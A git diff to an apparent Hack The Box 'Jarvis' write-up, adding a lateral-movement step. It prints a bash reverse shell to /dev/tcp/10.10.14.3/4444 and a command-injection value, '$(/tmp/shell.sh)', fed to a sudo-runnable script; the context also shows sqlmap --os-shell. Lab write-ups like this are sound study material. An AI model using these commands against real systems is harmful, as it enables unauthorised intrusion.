@@ -34,9 +34,27 @@ sqlmap -u http://10.10.10.143 --os-shell --crawl=2
 We can use this to get a more stable shell. We'll host a php reverse shell script on our attacking machine and download it using ```wget```. Then we browse to our page to get a reverse shell in return.
 
 # Lateral Movement
+We can run ```simpler.py``` as ```pepper```:
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/6.png">
+
+We can abuse this file to get a reverse shell as ```pepper```.
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Jarvis/assets/7.png">
+
+
+```
+echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' > /tmp/shell.sh
+chmod +x /tmp/shell.sh
+```
+And then again run the following code while we have our ```nc``` listener ready:
+```
+/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+```
+And enter ```$(/tmp/shell.sh)``` as IP. Now we have a shell als ```pepper```.
+
 
 # Privilege escalation
-
+[TO BE CONTINUED]
 
 
 
